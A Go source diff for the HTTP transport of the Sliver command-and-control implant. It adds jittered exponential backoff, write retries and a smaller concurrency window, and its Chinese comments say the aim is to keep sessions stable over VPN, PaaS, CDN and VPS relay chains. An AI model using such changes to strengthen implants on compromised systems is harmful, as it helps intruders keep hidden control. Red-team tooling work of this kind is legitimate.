@@ -53,6 +53,8 @@ import (
 	// {{end}}
 
 	// {{if .Config.IncludeHTTP}}
+	"math/rand"
+
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
 
@@ -652,7 +654,9 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 // {{end}} -IncludeWG
 
 // {{if .Config.IncludeHTTP}}
-const httpEnvelopeWriteWindow = 64
+// httpEnvelopeWriteWindow - 单会话最多并发的 POST 数。旧值 64 在多跳链路上
+// (VPN→PaaS→CDN→VPS)会瞬间开出几十条新连接,极易触发中间层限流,故调小。
+const httpEnvelopeWriteWindow = 8
 
 type httpEnvelopeWriter interface {
 	WriteEnvelope(*pb.Envelope) error
@@ -663,6 +667,20 @@ type httpEnvelopeWriter interface {
 // retired in source order: request base+window cannot launch until base has
 // completed. The server acknowledges a POST only after synchronous dispatch,
 // so this also bounds handler-level reordering.
+// httpRetryBackoff - 多跳链路下瞬时错误的退避时长(指数增长 + 抖动)。
+// 抖动可避免多个植入体/多次重试同步打满中间层。
+func httpRetryBackoff(attempt int) time.Duration {
+	if attempt < 1 {
+		attempt = 1
+	}
+	base := time.Duration(attempt) * 250 * time.Millisecond
+	if base > 5*time.Second {
+		base = 5 * time.Second
+	}
+	jitter := time.Duration(rand.Int63n(int64(base/2) + 1))
+	return base/2 + jitter
+}
+
 func sendHTTPEnvelopes(connection *Connection, send <-chan *pb.Envelope, writer httpEnvelopeWriter, window int) {
 	if connection == nil || writer == nil {
 		return
@@ -692,9 +710,29 @@ func sendHTTPEnvelopes(connection *Connection, send <-chan *pb.Envelope, writer 
 		retirements = append(retirements, retired)
 		go func(envelope *pb.Envelope, retired chan<- struct{}) {
 			defer close(retired)
-			if err := writer.WriteEnvelope(envelope); err != nil {
-				connection.Cleanup()
+			// 单次写失败不再立即拆掉整条会话:多跳链路瞬时抖动很常见,
+			// 先带抖动退避重试,超过上限才 Cleanup(与读循环对称)。
+			maxAttempts := GetMaxConnectionErrors()
+			if maxAttempts < 1 {
+				maxAttempts = 1
 			}
+			if maxAttempts > 5 {
+				maxAttempts = 5
+			}
+			for attempt := 1; attempt <= maxAttempts; attempt++ {
+				if err := writer.WriteEnvelope(envelope); err == nil {
+					return
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[http] write envelope failed (attempt %d/%d)", attempt, maxAttempts)
+				// {{end}}
+				select {
+				case <-connection.Done():
+					return
+				case <-time.After(httpRetryBackoff(attempt)):
+				}
+			}
+			connection.Cleanup()
 		}(envelope, retired)
 	}
 }
@@ -781,6 +819,13 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 						log.Printf("[http] transient error #%d: %#v", errCount, err)
 						// {{end}}
 						if errCount < opts.MaxErrors {
+							select {
+							case <-ctrl:
+								return
+							case <-connection.Done():
+								return
+							case <-time.After(httpRetryBackoff(errCount)):
+							}
 							continue
 						}
 						return // Max errors exceeded
@@ -790,6 +835,13 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 						log.Printf("[http] error: %#v", err)
 						// {{end}}
 						if errCount < opts.MaxErrors {
+							select {
+							case <-ctrl:
+								return
+							case <-connection.Done():
+								return
+							case <-time.After(httpRetryBackoff(errCount)):
+							}
 							continue
 						}
 						return // Max errors exceeded
